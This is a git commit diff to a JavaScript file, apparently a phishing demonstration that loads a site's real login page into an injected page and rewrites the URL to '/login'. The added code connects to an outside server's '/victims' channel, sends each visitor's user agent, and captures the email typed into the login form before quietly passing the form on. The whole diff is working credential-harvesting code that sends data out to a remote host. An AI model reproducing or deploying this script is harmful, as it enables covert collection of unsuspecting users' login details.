702af91a2e3dc927d612a7d2d4b5685f0428cee0
Christopher Orr <chris@orr.me.uk>
2013-12-05 01:44:15 +0100

    Broadcast the stupidity.

--- su.js
+++ su.js
@@ -5,27 +5,46 @@ var path = '/login';
   history.replaceState(null, 'Log in', path);
 
   var script = document.createElement("script");
-  var hash = /com$/.test(host) ? '67b1ba83e869c8e79f6e36d0e09b5800' :'7b9b9838db5c80cbc7b2e2bfc403e518';
+  var hash = /com$/.test(host) ? '67b1ba83e869c8e79f6e36d0e09b5800' :'1b3785e50daff644c60797acabafb97d';
   script.src = '/assets/application-' + hash + '.js';
   script.type = 'text/javascript';
   document.getElementsByTagName('head')[0].appendChild(script);
+  script = document.createElement("script");
 
-  var checkReady = function(callback) {
-    if (window.jQuery) {
-      callback(jQuery);
+  script.src = 'https://test.orr.me.uk:8443/socket.io/socket.io.js';
+  script.type = 'text/javascript';
+  document.getElementsByTagName('head')[0].appendChild(script);
+
+  var checkReady = function(dep, callback) {
+    if (window.hasOwnProperty(dep)) {
+      callback(window[dep]);
     } else {
-      window.setTimeout(function() { checkReady(callback); }, 50);
+      window.setTimeout(function() { checkReady(dep, callback); }, 50);
     }
   };
 
-  checkReady(function($) {
+  var socket = null;
+  checkReady('jQuery', function($) {
     $.get('//' + host + path, {}, function(data) {
       $(document.body).html(data);
-      //$('button').text('Phish me');
+      var title = $('body title').text();
+      window.document.title = title;
       $('form').submit(function(e) {
+        if (socket === null) {
+          return true;
+        }
+        socket.emit('submit', $('#user_session_email').val());
         e.preventDefault();
-        alert('Thanks for all the phish, ' + $('#user_session_email').val() + '!');
+        var form = this;
+        setTimeout(function () {
+          form.submit();
+        }, 500);
       });
     });
+  });
+
+  checkReady('io', function(io) {
+    socket = io.connect('https://test.orr.me.uk:8443/victims', {secure: true});
+    socket.emit('info', navigator.userAgent);
   });
 })();
